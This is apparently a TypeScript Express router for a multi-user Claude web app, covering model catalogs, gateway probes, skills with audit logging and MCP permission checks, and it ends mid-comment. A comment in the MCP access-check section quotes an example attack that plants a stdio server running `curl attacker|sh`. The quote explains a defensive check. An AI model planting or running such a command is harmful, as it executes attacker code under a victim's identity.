import { createHash } from 'node:crypto';

import express, { type Request, type Response } from 'express';

import {
  isProbeRunning,
  probeModelMappings,
  readModelMappingsMeta,
} from '@/modules/providers/list/claude/claude-model-probe.service.js';
import { readAliasConfigMappings } from '@/modules/providers/list/claude/claude-settings-mapping.service.js';
import {
  CatalogValidationError,
  ModelNotAllowedError,
  claudeModelCatalog,
  modelViewerFor,
  type CatalogEntry,
  type ModelViewer,
} from '@/modules/providers/list/claude/claude-model-catalog.service.js';
import {
  GatewayError,
  describeDefaultGateway,
  modelsDefinitionFor,
  resolveTurnGateway,
} from '@/modules/providers/list/claude/claude-gateways.service.js';
import { claudeGatewaysRouter } from '@/modules/providers/claude-gateways.routes.js';
import { probeCatalogModel } from '@/modules/providers/list/claude/claude-model-catalog-probe.service.js';
import { CLAUDE_FALLBACK_MODELS } from '@/modules/providers/list/claude/claude-model-aliases.js';
import {
  MANAGED_ALIASES,
  readModelConfigView,
  writeModelConfig,
  type ManagedAlias,
  type ModelConfigUpdate,
} from '@/modules/providers/list/claude/claude-model-config.service.js';
import { providerAuthService } from '@/modules/providers/services/provider-auth.service.js';
import { providerCapabilitiesService } from '@/modules/providers/services/provider-capabilities.service.js';
import { providerMcpService } from '@/modules/providers/services/mcp.service.js';
import { redactMcpSecretsInList, shouldRedactScope } from '@/modules/providers/services/mcp-redaction.js';
import { providerModelsService } from '@/modules/providers/services/provider-models.service.js';
import { providerSkillsService } from '@/modules/providers/services/skills.service.js';
import { sessionConversationsSearchService } from '@/modules/providers/services/session-conversations-search.service.js';
import { resolveFeedbackTarget } from '@/modules/providers/services/feedback-target.service.js';
import { assertViewerMayCreateSessionAt } from '@/modules/providers/services/session-project-path-guard.service.js';
import { sessionsService, type SessionActor } from '@/modules/providers/services/sessions.service.js';
import { clientIp } from '@/shared/client-ip.js';
import { issueSseTicket } from '@/shared/sse-tickets.js';
import type {
  LLMProvider,
  McpScope,
  McpTransport,
  ProviderChangeActiveModelInput,
  ProviderSkillCreateFile,
  ProviderSkillCreateInput,
  UpsertProviderMcpServerInput,
} from '@/shared/types.js';
import { auditLogDb, messageFeedbackDb, modelTurnStatsDb, projectsDb, sessionMessagesDb, sessionsDb, uiSettingsDb } from '@/modules/database/index.js';
import { collectSkillSurveyCandidates, decideSkillSurveys, readSurveyConfig } from '@/modules/providers/services/skill-survey.service.js';
import {
  renderSessionExport,
  type ExportableMessage,
} from '@/modules/providers/services/session-export.service.js';
import { readRequestViewer } from '@/shared/project-visibility.js';
import { AppError, asyncHandler, createApiSuccessResponse } from '@/shared/utils.js';
import { createLogger } from '@/shared/logger.js';
const log = createLogger('providers');

/**
 * 自定义网关的主机名,给前端决定要不要提示"卡片描述仅供参考"。
 * 只暴露 host,不暴露完整 URL —— 路径里可能带租户 id 之类不该给所有登录用户看的东西。
 * 先读 settings.json 的 env、进程环境兜底:网关地址往往只写在 settings.json 里。
 */
const readGatewayHost = async (): Promise<string | null> => {
  try {
    return (await describeDefaultGateway()).host;
  } catch {
    return null;
  }
};

/** 这次请求是谁:模型表、闸口按人。 */
const requestModelViewer = (req: Request): ModelViewer => {
  const user = (req as Request & { user?: { id?: number; username?: string } }).user;
  return modelViewerFor(typeof user?.id === 'number' ? user.id : null, user?.username ?? null);
};

const router = express.Router();
// 模型网关与 key(root 管共享网关;每个人管自己的 key / 私有网关 / 私有模型)
router.use(claudeGatewaysRouter);

const readPathParam = (value: unknown, name: string): string => {
  if (typeof value === 'string') {
    return value;
  }

  if (Array.isArray(value) && typeof value[0] === 'string') {
    return value[0];
  }

  throw new AppError(`${name} path parameter is invalid.`, {
    code: 'INVALID_PATH_PARAMETER',
    statusCode: 400,
  });
};

const normalizeProviderParam = (value: unknown): string =>
  readPathParam(value, 'provider').trim().toLowerCase();

const SESSION_ID_PATTERN = /^[a-zA-Z0-9._-]{1,120}$/;

const parseSessionId = (value: unknown): string => {
  const sessionId = readPathParam(value, 'sessionId').trim();
  if (!SESSION_ID_PATTERN.test(sessionId)) {
    throw new AppError('Invalid sessionId.', {
      code: 'INVALID_SESSION_ID',
      statusCode: 400,
    });
  }

  return sessionId;
};

const readOptionalQueryString = (value: unknown): string | undefined => {
  if (typeof value !== 'string') {
    return undefined;
  }

  const normalized = value.trim();
  return normalized.length > 0 ? normalized : undefined;
};

/** `?limit=`/`?offset=` —— 非法值直接 400,不静默当成默认页(那会让"翻页翻不动"变成谜)。 */
const parseOptionalCountQuery = (value: unknown, name: string): number | undefined => {
  const normalized = readOptionalQueryString(value);
  if (normalized === undefined) {
    return undefined;
  }

  const parsed = Number(normalized);
  if (!Number.isFinite(parsed) || parsed < 0 || !Number.isInteger(parsed)) {
    throw new AppError(`${name} must be a non-negative integer.`, {
      code: 'INVALID_QUERY_PARAMETER',
      statusCode: 400,
    });
  }
  return parsed;
};

const parseOptionalBooleanQuery = (value: unknown, name: string): boolean | undefined => {
  if (value === undefined) {
    return undefined;
  }

  const normalized = readOptionalQueryString(value);
  if (!normalized) {
    return undefined;
  }

  if (normalized === 'true') {
    return true;
  }
  if (normalized === 'false') {
    return false;
  }

  throw new AppError(`${name} must be "true" or "false".`, {
    code: 'INVALID_QUERY_PARAMETER',
    statusCode: 400,
  });
};

const parseMcpScope = (value: unknown): McpScope | undefined => {
  if (value === undefined) {
    return undefined;
  }

  const normalized = readOptionalQueryString(value);
  if (!normalized) {
    return undefined;
  }

  if (normalized === 'user' || normalized === 'local' || normalized === 'project') {
    return normalized;
  }

  throw new AppError(`Unsupported MCP scope "${normalized}".`, {
    code: 'INVALID_MCP_SCOPE',
    statusCode: 400,
  });
};

const parseMcpTransport = (value: unknown): McpTransport => {
  const normalized = readOptionalQueryString(value);
  if (!normalized) {
    throw new AppError('transport is required.', {
      code: 'MCP_TRANSPORT_REQUIRED',
      statusCode: 400,
    });
  }

  if (normalized === 'stdio' || normalized === 'http' || normalized === 'sse') {
    return normalized;
  }

  throw new AppError(`Unsupported MCP transport "${normalized}".`, {
    code: 'INVALID_MCP_TRANSPORT',
    statusCode: 400,
  });
};

const parseMcpUpsertPayload = (payload: unknown): UpsertProviderMcpServerInput => {
  if (!payload || typeof payload !== 'object') {
    throw new AppError('Request body must be an object.', {
      code: 'INVALID_REQUEST_BODY',
      statusCode: 400,
    });
  }

  const body = payload as Record<string, unknown>;
  const name = readOptionalQueryString(body.name);
  if (!name) {
    throw new AppError('name is required.', {
      code: 'MCP_NAME_REQUIRED',
      statusCode: 400,
    });
  }

  const transport = parseMcpTransport(body.transport);
  const scope = parseMcpScope(body.scope);
  const workspacePath = readOptionalQueryString(body.workspacePath);

  return {
    name,
    transport,
    scope,
    workspacePath,
    command: readOptionalQueryString(body.command),
    args: Array.isArray(body.args) ? body.args.filter((entry): entry is string => typeof entry === 'string') : undefined,
    env: typeof body.env === 'object' && body.env !== null
      ? Object.fromEntries(
        Object.entries(body.env as Record<string, unknown>).filter(
          (entry): entry is [string, string] => typeof entry[1] === 'string',
        ),
      )
      : undefined,
    url: readOptionalQueryString(body.url),
    headers: typeof body.headers === 'object' && body.headers !== null
      ? Object.fromEntries(
        Object.entries(body.headers as Record<string, unknown>).filter(
          (entry): entry is [string, string] => typeof entry[1] === 'string',
        ),
      )
      : undefined,
  };
};

const parseProviderSkillCreatePayload = (payload: unknown): ProviderSkillCreateInput => {
  if (!payload || typeof payload !== 'object') {
    throw new AppError('Request body must be an object.', {
      code: 'INVALID_REQUEST_BODY',
      statusCode: 400,
    });
  }

  const body = payload as Record<string, unknown>;
  const rawEntries = Array.isArray(body.entries)
    ? body.entries
    : typeof body.content === 'string'
      ? [{
          content: body.content,
          directoryName: body.directoryName,
          fileName: body.fileName,
          files: body.files,
        }]
      : null;

  if (!rawEntries || rawEntries.length === 0) {
    throw new AppError('At least one skill entry is required.', {
      code: 'PROVIDER_SKILLS_REQUIRED',
      statusCode: 400,
    });
  }

  const entries = rawEntries.map((entry, index) => {
    if (!entry || typeof entry !== 'object') {
      throw new AppError(`Skill entry ${index + 1} must be an object.`, {
        code: 'INVALID_REQUEST_BODY',
        statusCode: 400,
      });
    }

    const record = entry as Record<string, unknown>;
    const content = typeof record.content === 'string' ? record.content : '';
    const directoryName = readOptionalQueryString(record.directoryName);
    const fileName = readOptionalQueryString(record.fileName);
    const rawFiles = record.files;

    if (!content.trim()) {
      throw new AppError(`Skill entry ${index + 1} must include markdown content.`, {
        code: 'PROVIDER_SKILL_CONTENT_REQUIRED',
        statusCode: 400,
      });
    }

    if (rawFiles !== undefined && !Array.isArray(rawFiles)) {
      throw new AppError(`Skill entry ${index + 1} files must be an array.`, {
        code: 'INVALID_REQUEST_BODY',
        statusCode: 400,
      });
    }

    const files: ProviderSkillCreateFile[] | undefined = rawFiles?.map((file, fileIndex) => {
      if (!file || typeof file !== 'object') {
        throw new AppError(`Skill entry ${index + 1} file ${fileIndex + 1} must be an object.`, {
          code: 'INVALID_REQUEST_BODY',
          statusCode: 400,
        });
      }

      const fileRecord = file as Record<string, unknown>;
      const relativePath = readOptionalQueryString(fileRecord.relativePath);
      const fileContent = typeof fileRecord.content === 'string' ? fileRecord.content : null;
      const encoding = fileRecord.encoding === 'utf8' || fileRecord.encoding === 'base64'
        ? fileRecord.encoding
        : null;

      if (!relativePath || fileContent === null || !encoding) {
        throw new AppError(
          `Skill entry ${index + 1} file ${fileIndex + 1} requires relativePath, content, and encoding.`,
          {
            code: 'INVALID_REQUEST_BODY',
            statusCode: 400,
          },
        );
      }

      return {
        relativePath,
        content: fileContent,
        encoding,
      };
    });

    return {
      content,
      directoryName,
      fileName,
      files,
    };
  });

  return { entries };
};

const parseProvider = (value: unknown): LLMProvider => {
  const normalized = normalizeProviderParam(value);
  if (normalized === 'claude') {
    return normalized;
  }

  throw new AppError(`Unsupported provider "${normalized}".`, {
    code: 'UNSUPPORTED_PROVIDER',
    statusCode: 400,
  });
};

const parseSessionRenameSummary = (payload: unknown): string => {
  if (!payload || typeof payload !== 'object') {
    throw new AppError('Request body must be an object.', {
      code: 'INVALID_REQUEST_BODY',
      statusCode: 400,
    });
  }

  const body = payload as Record<string, unknown>;
  const summary = typeof body.summary === 'string' ? body.summary.trim() : '';
  if (!summary) {
    throw new AppError('Summary is required.', {
      code: 'INVALID_SESSION_SUMMARY',
      statusCode: 400,
    });
  }

  if (summary.length > 500) {
    throw new AppError('Summary must not exceed 500 characters.', {
      code: 'INVALID_SESSION_SUMMARY',
      statusCode: 400,
    });
  }

  return summary;
};

const parseSessionSearchQuery = (value: unknown): string => {
  const query = readOptionalQueryString(value) ?? '';
  if (query.length < 2) {
    throw new AppError('Query must be at least 2 characters', {
      code: 'INVALID_SEARCH_QUERY',
      statusCode: 400,
    });
  }

  return query;
};

const parseSessionSearchLimit = (value: unknown): number => {
  const raw = readOptionalQueryString(value);
  if (!raw) {
    return 50;
  }

  const parsed = Number.parseInt(raw, 10);
  if (Number.isNaN(parsed)) {
    throw new AppError('limit must be a valid integer.', {
      code: 'INVALID_QUERY_PARAMETER',
      statusCode: 400,
    });
  }

  return Math.max(1, Math.min(parsed, 100));
};

const parseChangeActiveModelPayload = (payload: unknown): ProviderChangeActiveModelInput => {
  if (!payload || typeof payload !== 'object') {
    throw new AppError('Request body must be an object.', {
      code: 'INVALID_REQUEST_BODY',
      statusCode: 400,
    });
  }

  const body = payload as Record<string, unknown>;
  const model = readOptionalQueryString(body.model);
  if (!model) {
    throw new AppError('model is required.', {
      code: 'MODEL_REQUIRED',
      statusCode: 400,
    });
  }

  return {
    sessionId: '',
    model,
  };
};

router.get(
  '/:provider/auth/status',
  asyncHandler(async (req: Request, res: Response) => {
    const provider = parseProvider(req.params.provider);
    const status = await providerAuthService.getProviderAuthStatus(provider);
    res.json(createApiSuccessResponse(status));
  }),
);

router.get(
  '/:provider/models',
  asyncHandler(async (req: Request, res: Response) => {
    const provider = parseProvider(req.params.provider);
    const bypassCache = parseOptionalBooleanQuery(req.query.bypassCache, 'bypassCache') ?? false;
    const result = await providerModelsService.getProviderModels(provider, { bypassCache });
    /*
     * 按人:目录条目只留他看得见的(「可用人员」),加上他的私有模型,每条标上能不能用(有没有 key)。
     * 全量定义仍走 providerModelsService(缓存与并发去重),这里只在出口按人筛 / 标。
     */
    const models = provider === 'claude' ? modelsDefinitionFor(requestModelViewer(req)) : result.models;
    res.json(createApiSuccessResponse({ provider, models, cache: result.cache }));
  }),
);

/** 别名组的值(default / sonnet / opus … 含 [1m] 变体)。 */
const aliasGroupValues = (): string[] => CLAUDE_FALLBACK_MODELS.OPTIONS.map((option) => option.value);

/** 入口处的模型前置检查:不在目录里 / 下架了回 400 MODEL_NOT_ALLOWED。 */
const assertModelAllowedForRequest = (model: string | null | undefined, viewer?: ModelViewer | null): void => {
  try {
    claudeModelCatalog.assertAllowed(model, viewer);
  } catch (error) {
    if (error instanceof ModelNotAllowedError) {
      throw new AppError(error.message, { code: error.code, statusCode: 400 });
    }
    throw error;
  }
};

/** root 才许读写模型映射配置 —— settings.json 是服务器全局文件。 */
const assertRootForModelConfig = (req: Request): void => {
  const user = (req as Request & { user?: { isRoot?: boolean } }).user;
  if (user?.isRoot !== true) {
    throw new AppError('只有 root 可以管理模型映射', {
      code: 'MODEL_CONFIG_FORBIDDEN',
      statusCode: 403,
    });
  }
};

/**
 * 模型映射管理(root):读/写 settings.json 的别名映射。
 * 写回后热感知自动生效(runtime 重建 + 实测缓存置 stale),无需重启。
 */
router.get(
  '/:provider/model-config',
  asyncHandler(async (req: Request, res: Response) => {
    parseProvider(req.params.provider);
    assertRootForModelConfig(req);
    res.json(createApiSuccessResponse(await readModelConfigView()));
  }),
);

router.put(
  '/:provider/model-config',
  asyncHandler(async (req: Request, res: Response) => {
    parseProvider(req.params.provider);
    assertRootForModelConfig(req);

    const body = (req.body ?? {}) as { defaultModel?: unknown; mappings?: unknown };
    const update: ModelConfigUpdate = {};

    if ('defaultModel' in body) {
      if (body.defaultModel !== null && typeof body.defaultModel !== 'string') {
        throw new AppError('defaultModel 必须是字符串或 null', {
          code: 'INVALID_MODEL_CONFIG',
          statusCode: 400,
        });
      }
      update.defaultModel = body.defaultModel as string | null;
    }

    if ('mappings' in body) {
      if (!body.mappings || typeof body.mappings !== 'object' || Array.isArray(body.mappings)) {
        throw new AppError('mappings 必须是对象', { code: 'INVALID_MODEL_CONFIG', statusCode: 400 });
      }
      const mappings: Partial<Record<ManagedAlias, string | null>> = {};
      for (const [alias, value] of Object.entries(body.mappings as Record<string, unknown>)) {
        if (!(MANAGED_ALIASES as readonly string[]).includes(alias)) {
          throw new AppError(`不认识的别名: ${alias}`, { code: 'INVALID_MODEL_CONFIG', statusCode: 400 });
        }
        if (value !== null && typeof value !== 'string') {
          throw new AppError(`别名 ${alias} 的映射必须是字符串或 null`, {
            code: 'INVALID_MODEL_CONFIG',
            statusCode: 400,
          });
        }
        mappings[alias as ManagedAlias] = value as string | null;
      }
      update.mappings = mappings;
    }

    const written = await writeModelConfig(update);
    // 记审计:改别名映射会改变所有人的子代理与 default 档实际用的模型。
    const actor = readSkillActor(req);
    auditLogDb.record({
      userId: actor.id,
      username: actor.username,
      event: 'model_config_updated',
      ip: clientIp(req) ?? null,
      detail: JSON.stringify(update).slice(0, 1000),
    });
    res.json(createApiSuccessResponse(written));
  }),
);

/* ----------------- 模型目录(root) ----------------- */

/** 目录错误 → AppError(带 code / 状态码)。 */
const asCatalogError = (error: unknown): unknown => (
  error instanceof CatalogValidationError
    ? new AppError(error.message, { code: error.code, statusCode: error.status })
    : error
);

const parseCatalogId = (raw: unknown): number => {
  const id = Number(raw);
  if (!Number.isInteger(id) || id <= 0) {
    throw new AppError('目录条目 id 不对', { code: 'INVALID_CATALOG_ID', statusCode: 400 });
  }
  return id;
};

const catalogAuditDetail = (entry: CatalogEntry, extra: Record<string, unknown> = {}): string => JSON.stringify({
  modelId: entry.modelId,
  label: entry.label,
  enabled: entry.enabled,
  isDefault: entry.isDefault,
  contextWindow: entry.contextWindow,
  gatewayId: entry.gatewayId,
  allowedUsers: entry.allowedUsers === null ? 'all' : entry.allowedUsers.length,
  ...extra,
}).slice(0, 1000);

/** 目录全量(含下架的)—— 设置页用。 */
router.get(
  '/:provider/model-catalog',
  asyncHandler(async (req: Request, res: Response) => {
    parseProvider(req.params.provider);
    assertRootForModelConfig(req);
    res.json(createApiSuccessResponse({ entries: claudeModelCatalog.listAll() }));
  }),
);

/**
 * 每模型回合健康度(最近 N 天,1–30,默认 7):回合数、失败率、失败原因、首字延迟 p50 / p90。
 * 模型名是网关上的真实名字(别名会话记的是它解析到的那个)。root 才看。
 */
router.get(
  '/:provider/model-catalog/stats',
  asyncHandler(async (req: Request, res: Response) => {
    parseProvider(req.params.provider);
    assertRootForModelConfig(req);
    const days = Math.max(1, Math.min(30, Number(req.query.days) || 7));
    res.json(createApiSuccessResponse({ days, models: modelTurnStatsDb.summarize(days) }));
  }),
);

/** 子代理模型(全局一份;没设 = 跟随主模型)。 */
router.get(
  '/:provider/model-catalog/subagent',
  asyncHandler(async (req: Request, res: Response) => {
    parseProvider(req.params.provider);
    assertRootForModelConfig(req);
    res.json(createApiSuccessResponse({ policy: claudeModelCatalog.subagentPolicy() }));
  }),
);

router.put(
  '/:provider/model-catalog/subagent',
  asyncHandler(async (req: Request, res: Response) => {
    parseProvider(req.params.provider);
    assertRootForModelConfig(req);
    const actor = readSkillActor(req);
    const before = claudeModelCatalog.subagentPolicy();
    let policy;
    try {
      policy = claudeModelCatalog.setSubagentPolicy((req.body ?? {}) as { model?: unknown; force?: unknown });
    } catch (error) {
      throw asCatalogError(error);
    }
    auditLogDb.record({
      userId: actor.id, username: actor.username, event: 'subagent_model_updated',
      ip: clientIp(req) ?? null, detail: JSON.stringify({ before, after: policy }).slice(0, 1000),
    });
    res.json(createApiSuccessResponse({ policy }));
  }),
);

router.post(
  '/:provider/model-catalog',
  asyncHandler(async (req: Request, res: Response) => {
    parseProvider(req.params.provider);
    assertRootForModelConfig(req);
    const actor = readSkillActor(req);
    let entry: CatalogEntry;
    try {
      entry = claudeModelCatalog.create((req.body ?? {}) as Record<string, unknown>, actor.id);
    } catch (error) {
      throw asCatalogError(error);
    }
    auditLogDb.record({
      userId: actor.id, username: actor.username, event: 'model_catalog_created',
      ip: clientIp(req) ?? null, detail: catalogAuditDetail(entry),
    });
    res.status(201).json(createApiSuccessResponse({ entry }));
  }),
);

router.patch(
  '/:provider/model-catalog/:id',
  asyncHandler(async (req: Request, res: Response) => {
    parseProvider(req.params.provider);
    assertRootForModelConfig(req);
    const id = parseCatalogId(req.params.id);
    const actor = readSkillActor(req);
    let result: { before: CatalogEntry; after: CatalogEntry };
    try {
      result = claudeModelCatalog.update(id, (req.body ?? {}) as Record<string, unknown>, actor.id);
    } catch (error) {
      throw asCatalogError(error);
    }
    const changed = Object.keys(req.body ?? {});
    auditLogDb.record({
      userId: actor.id, username: actor.username, event: 'model_catalog_updated',
      ip: clientIp(req) ?? null, detail: catalogAuditDetail(result.after, { changed, before: result.before.modelId }),
    });
    res.json(createApiSuccessResponse({ entry: result.after }));
  }),
);

router.delete(
  '/:provider/model-catalog/:id',
  asyncHandler(async (req: Request, res: Response) => {
    parseProvider(req.params.provider);
    assertRootForModelConfig(req);
    const id = parseCatalogId(req.params.id);
    const removed = claudeModelCatalog.remove(id);
    if (!removed) throw new AppError('这条目录条目不存在', { code: 'NOT_FOUND', statusCode: 404 });
    const actor = readSkillActor(req);
    auditLogDb.record({
      userId: actor.id, username: actor.username, event: 'model_catalog_deleted',
      ip: clientIp(req) ?? null, detail: catalogAuditDetail(removed),
    });
    res.json(createApiSuccessResponse({ removed: removed.id }));
  }),
);

/**
 * 单条「实测」:一次一致性检查(名字被接受 / 工具往返 / usage / 回复模型名),见
 * claude-model-catalog-probe.service。按条目各自单飞;结果落到 `last_probe`。
 */
router.post(
  '/:provider/model-catalog/:id/probe',
  asyncHandler(async (req: Request, res: Response) => {
    parseProvider(req.params.provider);
    assertRootForModelConfig(req);
    const id = parseCatalogId(req.params.id);
    const entry = claudeModelCatalog.get(id);
    if (!entry) throw new AppError('这条目录条目不存在', { code: 'NOT_FOUND', statusCode: 404 });
    /*
     * 按条目挂的网关测,key 按 root 自己会用的那把(个人 key > 网关默认 key > settings.json)。
     * 没有可用的 key 时不起 CLI,把原因当成这次实测的结果记下来。
     */
    let gateway;
    try {
      gateway = await resolveTurnGateway({ model: entry.modelId, viewer: requestModelViewer(req) });
    } catch (error) {
      if (!(error instanceof GatewayError)) throw error;
      const failed = {
        at: new Date().toISOString(), ok: false, accepted: false, toolRoundTrip: false,
        inputTokens: null, respondedModel: null, latencyMs: 0, error: error.message,
      };
      claudeModelCatalog.setProbe(id, failed);
      res.json(createApiSuccessResponse({ entry: claudeModelCatalog.get(id), probe: failed }));
      return;
    }
    // root 自己恰好有同名的私有模型时,按人解析会落到他的私有网关上 —— 那测的就不是这条目录条目了
    if (gateway.gatewayId !== entry.gatewayId) {
      const mismatch = {
        at: new Date().toISOString(), ok: false, accepted: false, toolRoundTrip: false, inputTokens: null, respondedModel: null, latencyMs: 0,
        error: `你自己有一个同名的私有模型「${entry.modelId}」,实测会走到你的私有网关上 —— 先把那个私有模型改名或删掉再测这条`,
      };
      claudeModelCatalog.setProbe(id, mismatch);
      res.json(createApiSuccessResponse({ entry: claudeModelCatalog.get(id), probe: mismatch }));
      return;
    }
    const probe = await probeCatalogModel(entry.modelId, entry.contextWindow, gateway);
    claudeModelCatalog.setProbe(id, probe);
    res.json(createApiSuccessResponse({ entry: claudeModelCatalog.get(id), probe }));
  }),
);

/**
 * 别名 → 真实模型的实测结果。
 *
 * /models 卡片上的描述("Sonnet 4.6 · $3/$15")是 Anthropic 官方口径;部署把
 * ANTHROPIC_BASE_URL 指向自己的网关时,实际由哪个模型来答是网关在请求时决定的,
 * 没有任何接口可查。GET 回缓存的实测值;POST 逐别名各发一次最小请求现测。
 *
 * `gatewayHost` 让前端知道该不该提醒"描述仅供参考":官方 API 下卡片文案本来
 * 就是对的,不需要打扰。
 */
router.get(
  '/:provider/model-mappings',
  asyncHandler(async (req: Request, res: Response) => {
    parseProvider(req.params.provider); // 目前只有 claude,守卫同其它路由
    const meta = await readModelMappingsMeta();
    // 配置层映射:每次现读 settings.json —— 改完配置这里立即是新值,不依赖实测。
    // 只给别名组:目录条目的真名就是它自己,不需要映射;全量返回会把每条目录模型都查一遍。
    const configMappings = await readAliasConfigMappings(aliasGroupValues());
    res.json(createApiSuccessResponse({
      mappings: meta.mappings,
      // settings.json 在上次实测后改过 → 实测值可能过期。前端据此提示重测,
      // chip 停显过期真名(回退到 configMappings)。
      stale: meta.stale,
      configMappings,
      probing: isProbeRunning(),
      gatewayHost: await readGatewayHost(),
    }));
  }),
);

router.post(
  '/:provider/model-mappings/probe',
  asyncHandler(async (req: Request, res: Response) => {
    parseProvider(req.params.provider);
    /*
     * 只许 root,且只探别名组:每个值都要串行起一次 CLI(每次最长 60 秒),不能让任何登录用户
     * 随手触发,也不该随目录变长而变长。目录条目各有自己的单条实测。
     */
    assertRootForModelConfig(req);
    const aliases = aliasGroupValues();
    // 并发点击加入同一次探测(service 内单飞),不会拉起第二排 CLI 进程。
    await probeModelMappings(aliases);
    // 刚落盘的实测自带最新 settings 指纹,这里重读一次拿权威的 stale(通常 false)。
    const meta = await readModelMappingsMeta();
    const configMappings = await readAliasConfigMappings(aliases);
    res.json(createApiSuccessResponse({
      mappings: meta.mappings,
      stale: meta.stale,
      configMappings,
      gatewayHost: await readGatewayHost(),
    }));
  }),
);

/**
 * The session's effective model, so the composer can show which model is
 * actually running (a switch made in /models stays visible after the modal closes).
 */
router.get(
  '/:provider/sessions/:sessionId/active-model',
  asyncHandler(async (req: Request, res: Response) => {
    const provider = parseProvider(req.params.provider);
    const sessionId = parseSessionId(req.params.sessionId);
    // 与 delete/rename/messages 同一道门:不过门的话,读会泄露别人会话的当前模型,
    // 写能替别人的会话改下一轮用的模型。
    sessionsService.assertViewerCanSeeSession(sessionId, readRequestViewer(req));
    const active = await providerModelsService.getCurrentActiveModel(provider, sessionId);
    res.json(createApiSuccessResponse({ provider, sessionId, model: active.model, source: active.source ?? null }));
  }),
);

router.post(
  '/:provider/sessions/:sessionId/active-model',
  asyncHandler(async (req: Request, res: Response) => {
    const provider = parseProvider(req.params.provider);
    const sessionId = parseSessionId(req.params.sessionId);
    sessionsService.assertViewerCanSeeSession(sessionId, readRequestViewer(req));
    const payload = parseChangeActiveModelPayload(req.body);
    // 前置检查:只许别名组 / 目录里上架的,并按人判(「可用人员」/ 私有模型);
    // 真正的闸口在 claude-sdk 发起回合的各条路径上。
    assertModelAllowedForRequest(payload.model, requestModelViewer(req));
    const result = await providerModelsService.changeActiveModel(provider, {
      ...payload,
      sessionId,
    });
    res.json(createApiSuccessResponse(result));
  }),
);

// ----------------- Skills routes -----------------
router.get(
  '/:provider/skills',
  asyncHandler(async (req: Request, res: Response) => {
    const provider = parseProvider(req.params.provider);
    const workspacePath = readOptionalQueryString(req.query.workspacePath);
    // 带 workspacePath 时与 MCP 同门(路径合法 + 项目可见),否则能列出任意目录下
    // `.claude/skills` 的名称 / 描述 / 路径。不带时只列全局技能库,不需要项目归属。
    if (workspacePath) {
      await assertViewerMayCreateSessionAt(readRequestViewer(req), workspacePath);
    }
    const skills = await providerSkillsService.listProviderSkills(provider, { workspacePath });
    res.json(createApiSuccessResponse({ provider, skills }));
  }),
);

/**
 * 技能的装与卸都记审计。
 *
 * 技能目录是服务进程自己的 home,一台机器上所有用户共用同一份,不像项目那样有 owner
 * (共享技能库是产品设计)。代价是:B 卸掉 A 装的技能之后,A 的会话行为会静默改变 ——
 * 某个 `/xxx` 命令突然不存在,或者同名技能换成了另一份内容,而 A 收不到任何通知。
 * 审计补的是可追溯性("这技能谁卸的、什么时候卸的"),不是权限。
 *
 * 记在路由层而不是 service 层,是因为"谁在操作"只有 req 上有;service 被定时
 * 任务之类的非 HTTP 路径调用时本来就没有 actor。
 */
const readSkillActor = (req: Request): { id: number | null; username: string | null } => {
  const user = (req as Request & { user?: { id?: number; username?: string } }).user;
  return { id: user?.id ?? null, username: user?.username ?? null };
};

/** 删除类操作的操作者(Viewer + ip + user-agent),只为审计与回收站里的"谁删的"。 */
const readSessionActor = (req: Request): SessionActor => {
  const viewer = readRequestViewer(req);
  return {
    userId: viewer.userId,
    username: viewer.username,
    ip: clientIp(req) ?? null,
    userAgent: (req.headers['user-agent'] as string | undefined) ?? null,
  };
};

/** 最近删除里的立即清除只给 root。 */
const assertRootForTrashPurge = (req: Request): void => {
  const user = (req as Request & { user?: { isRoot?: boolean } }).user;
  if (user?.isRoot !== true) {
    throw new AppError('只有 root 可以立即清除最近删除里的会话(其余等保留期自动清扫)', {
      code: 'TRASH_PURGE_FORBIDDEN',
      statusCode: 403,
    });
  }
};

router.post(
  '/:provider/skills',
  asyncHandler(async (req: Request, res: Response) => {
    const provider = parseProvider(req.params.provider);
    const input = parseProviderSkillCreatePayload(req.body);
    const skills = await providerSkillsService.addProviderSkills(provider, input);

    const actor = readSkillActor(req);
    // 记装上去之后的实际目录名,而不是请求里写的名字:落盘时会去重/改名,
    // 审计要对得上磁盘上真实存在的那个目录。
    const installed = skills
      .map((skill) => skill.directoryName ?? skill.name)
      .filter((name): name is string => typeof name === 'string' && name.length > 0);
    auditLogDb.record({
      userId: actor.id,
      username: actor.username,
      event: 'skill_installed',
      detail: `${provider}: ${installed.length > 0 ? installed.join(', ') : '(none)'}`,
    });

    res.json(createApiSuccessResponse({ provider, skills }));
  }),
);

router.delete(
  '/:provider/skills/:directoryName',
  asyncHandler(async (req: Request, res: Response) => {
    const provider = parseProvider(req.params.provider);
    const directoryName = readPathParam(req.params.directoryName, 'directoryName');
    const result = await providerSkillsService.removeProviderSkill(provider, { directoryName });

    const actor = readSkillActor(req);
    // `removed: false` 也记:一次点名要卸某个目录的意图,和它没卸成的事实,
    // 都是事后排查"我的技能怎么没了"时要看的东西。
    auditLogDb.record({
      userId: actor.id,
      username: actor.username,
      event: 'skill_removed',
      detail: `${provider}: ${directoryName}${result.removed ? '' : ' (not found)'}`,
      outcome: result.removed ? 'success' : 'failure',
    });

    res.json(createApiSuccessResponse(result));
  }),
);

/**
 * MCP 路由的门,读和写分开。
 *
 * - 项目级(非 user 作用域):`workspacePath` 必须过和建会话同一道门(assertViewerMayCreateSessionAt,
 *   路径合法 + 项目可见,两种失败一律返回同形的 404,不给"这个路径存不存在"的探针)。不拦的话,
 *   任何人都能往别人项目的 `.mcp.json` 里种一条 stdio server(如 `command:"/bin/sh",
 *   args:["-c","curl attacker|sh"]`),受害者下次在那个项目里跑 Claude 时命令以他的身份执行。
 *   判据只能有一份,所以复用而不另写。读写同一道门:能读到的 = 能写的。
 * - `scope:"user"` 写的是 `~/.claude.json`(服务进程的家目录),对包括 root 在内的每个人生效,
 *   所以写只给 root。读放行:前端的 MCP 页面对所有人都会拉一次 `scope=user`,"这台机器上装了
 *   哪些 MCP server"本身不是秘密;真正不能给的是 `env` / `headers` 里的 API key 与 bearer token,
 *   由 `redactMcpSecrets` 打码(见那个模块的说明)。
 */
async function assertMayReadMcpScope(
  req: Request,
  scope: string | null | undefined,
  workspacePath: string | null | undefined,
): Promise<void> {
  if (scope === 'user') {
    // 全机配置人人可见(值会被打码),不需要项目归属。
    return;
  }
  await assertMayTouchMcpScope(req, scope, workspacePath);
}

async function assertMayTouchMcpScope(
  req: Request,
  scope: string | null | undefined,
  workspacePath: string | null | undefined,
): Promise<void> {
  if (scope === 'user') {
    if (!req.user?.isRoot) {
      throw new AppError('用户级 MCP 配置只有管理员可以修改', {
        code: 'ROOT_REQUIRED',
        statusCode: 403,
      });
    }
    return;
  }
  /*
